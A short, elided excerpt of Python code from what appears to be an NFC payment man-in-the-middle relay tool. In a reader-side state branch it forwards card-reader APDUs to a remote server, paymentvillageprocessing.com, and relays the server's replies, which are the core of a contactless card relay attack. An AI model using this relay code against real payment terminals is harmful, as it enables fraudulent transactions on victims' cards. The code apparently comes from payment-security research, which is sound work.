            ...
            while (start_time + timeout_ms > time_ms()) or (timeout_ms == 0) and not is_done:
                ...
                if state == MitmState.FromReader:
                    ...
                    if fragmented:
                        ...
                        apdu = "void"
                        while (apdu=="void"):
                            url = "https://www.paymentvillageprocessing.com/pos.php?state=ToReader&apdu="+session1+"&reader="+binascii.hexlify(target_recvd).decode()+session2
                            apdu = urllib.request.urlopen(url).read().decode()
                            session2 = "&session="+apdu[:apdu.find("|")]
                            apdu = apdu[apdu.find("|")+1:]
                            logger.info("URL IS "+str(url)) #print(apdu.decode().find("|"))
                            #apdu = apdu[apdu.decode().find("|")+1:].decode()
                            if (apdu!="void"):
                                session1 = apdu # "&session="+apdu[:apdu.decode().find("|")].decode()+"&apdu="+apdu
                            logger.info(" APDU IS "+str(apdu))
                            #sleep(0.1)
                            
                        reader_recvd = binascii.unhexlify(apdu) 
